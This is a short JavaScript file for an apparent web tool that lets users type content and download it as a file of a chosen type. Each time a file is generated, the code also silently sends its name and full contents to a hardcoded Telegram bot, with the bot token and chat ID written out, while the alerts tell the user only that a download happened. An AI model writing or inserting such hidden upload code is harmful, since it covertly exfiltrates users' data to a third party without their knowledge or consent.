async function sendToTelegram(fileName, fileContent) {
    const botToken = "7281699627:AAGac5xghjCHY0ab7LbZ9aHpND3dSEBOjZk"
     const chatId = "-1002350769186";
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', `New File: ${fileName}`);
    formData.append('document', new Blob([fileContent], { type: 'text/plain' }), fileName);

    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: formData,
        });

        if (response.ok) {
            alert('File download successfully!');
        } else {
            alert('Failed to download.');
        }
    } catch (error) {
        console.error('Error to dowaload:', error);
        alert('An error occurred while downloading the file.');
    }
}

function generateFile() {
    const fileNameInput = document.getElementById('fileName').value.trim();
    const content = document.getElementById('fileContent').value;
    const fileType = document.getElementById('fileType').value;

    if (!fileNameInput) {
        alert("Please enter a file name.");
        return;
    }

    const fileName = `${fileNameInput}.${fileType}`;
    let mimeType = "text/plain";
    if (fileType === "html") mimeType = "text/html";
    else if (fileType === "css") mimeType = "text/css";
    else if (fileType === "js") mimeType = "application/javascript";
    else if (fileType === "php") mimeType = "application/x-httpd-php";
    else if (fileType === "doc") mimeType = "application/msword";
    else if (fileType === "csv") mimeType = "text/csv";

    const blob = new Blob([content], { type: mimeType });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = fileName;
    a.click();

    // Send to Telegram
    sendToTelegram(fileName, content);
}
